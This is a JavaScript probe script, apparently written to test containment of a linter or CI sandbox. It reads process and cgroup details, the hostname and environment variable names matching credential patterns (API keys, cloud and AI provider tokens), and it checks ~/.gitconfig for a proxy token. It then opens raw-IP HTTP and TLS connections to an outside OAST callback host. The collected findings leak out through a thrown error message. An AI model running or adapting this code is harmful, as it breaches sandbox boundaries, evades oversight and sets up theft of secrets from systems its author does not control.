// H122 probe 2 — same containment fingerprint plus DNS-less raw-IP egress attempts.
// Previous linter-cell evidence (H67b) showed DNS ENOTFOUND only; this tests whether a
// direct IP connection works when no name resolution is needed.
const fs = require('fs');
const os = require('os');
const { spawnSync } = require('child_process');

const OAST = 'dc2edfu9g0uaue02jcs0zzx78ato7b7fo.oast.site';
const OAST_IP = '178.128.16.97';
const p = [];

try { p.push('uid=' + process.getuid()); } catch (e) { p.push('uid=ERR'); }
try {
  const cg = fs.readFileSync('/proc/self/cgroup', 'utf8').split('\n').filter((l) => l.indexOf('memory') !== -1);
  p.push('cg=' + cg.join('|').slice(0, 160));
} catch (e) { p.push('cg=ERR'); }
try {
  p.push('pid1=' + fs.readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').trim().slice(0, 70));
} catch (e) { p.push('pid1=ERR'); }
try { p.push('host=' + os.hostname()); } catch (e) { p.push('host=ERR'); }

let names = [];
try { names = fs.readFileSync('/proc/self/environ', 'utf8').split('\0').filter(Boolean).map((s) => s.split('=')[0]); } catch (e) {}
const hits = names.filter((n) => /KEY|TOKEN|SECRET|PASS|CRED|DATABASE|GITHUB|GITLAB|JIRA|SMTP|STRIPE|PINECONE|LANGCHAIN|ANTHROPIC|OPENAI|GOOGLE|GCP|AWS|AZURE|SLACK|PROXY/i.test(n));
p.push('envn=' + names.length);
p.push('envhits=' + hits.join(','));

try {
  const gc = fs.readFileSync(os.homedir() + '/.gitconfig', 'utf8');
  const m = gc.match(/Proxy-Tokenizer\s*=\s*(\S+)/i);
  p.push('toklen=' + (m ? m[1].length : 0));
} catch (e) { p.push('toklen=' + (e.code || 'ERR')); }

const child = [
  "const net=require('net');const tls=require('tls');const dns=require('dns');const out=[];",
  "dns.lookup('" + OAST + "',(e,a)=>{out.push(e?'DNSERR='+e.code:'DNS='+a);",
  "const c=net.connect({host:'" + OAST_IP + "',port:80,timeout:3000},()=>{c.write('GET /h122ip HTTP/1.1\\r\\nHost: " + OAST + "\\r\\nX-H122: ip-http\\r\\nConnection: close\\r\\n\\r\\n');});",
  "c.on('data',()=>out.push('IP80=DATA'));c.on('connect',()=>out.push('IP80=CONN'));c.on('error',x=>out.push('IP80ERR='+x.code));c.on('timeout',()=>{c.destroy();out.push('IP80ERR=timeout')});",
  "setTimeout(()=>{try{const t=tls.connect({host:'" + OAST_IP + "',port:443,servername:'" + OAST + "',rejectUnauthorized:false,timeout:3000},()=>{t.write('GET /h122ips HTTP/1.1\\r\\nHost: " + OAST + "\\r\\nX-H122: ip-https\\r\\nConnection: close\\r\\n\\r\\n');});t.on('connect',()=>out.push('IP443=CONN'));t.on('data',()=>out.push('IP443=DATA'));t.on('error',x=>out.push('IP443ERR='+x.code));t.on('timeout',()=>{t.destroy();out.push('IP443ERR=timeout')});}catch(e){out.push('IP443ERR=EX')}},400);",
  "setTimeout(()=>{console.log(out.join(';'));process.exit(0)},6500);});",
].join('');
try {
  const r = spawnSync(process.execPath, ['-e', child], { timeout: 12000, encoding: 'utf8' });
  p.push('ip=[(' + (r.stdout || '') + ')' + (r.stderr || '').replace(/\s+/g, ';') + ']');
} catch (e) { p.push('ip=SPAWNERR'); }

throw new Error('H122B-PRISMA ' + p.join(' | '));
